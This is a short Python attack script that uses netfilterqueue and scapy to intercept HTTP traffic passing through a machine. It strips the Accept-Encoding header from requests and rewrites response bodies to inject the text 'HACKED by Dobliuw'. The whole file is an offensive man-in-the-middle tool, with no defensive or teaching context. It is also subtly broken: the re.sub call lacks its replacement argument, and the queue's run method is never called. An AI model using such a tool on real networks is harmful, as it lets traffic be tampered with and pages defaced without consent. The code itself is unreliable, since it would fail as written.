#!/usr/bin/env python3 
import netfilterqueue, sys, signal, os, re
import scapy.all as scapy
from termcolor import colored

def ctrl_c (sig, frame):
    print(colored("\n\n\t[!] Quiting...\n\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def set_load(packet, payload):
    packet[scapy.Raw].load = payload

    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len 
    del packet[scapy.IP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80: # Requests packets

                new_payload = re.sub(b"Accept-Encoding:.*?\\r\\n", scapy_packet[scapy.Raw].load)
                new_modified_packet = set_load(scapy_packet, new_payload)
                packet.set_payload(new_modified_packet.build())

            elif scapy_packet[scapy.TCP].sport == 80: # Response packets
                
                new_payload = scapy_packet[scapy.Raw].load.replace(b"SomeTextOfTheWebsite", b"HACKED by Dobliuw")
                new_modified_packet = set_load(scapy_packet, new_payload)
                packet.set_payload(new_modified_packet.build())

        except Exception as e:
            print(colored(f"\n\n\t[!] An error ocurred: {e}\n\n", "red"))

    packet.accept()

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run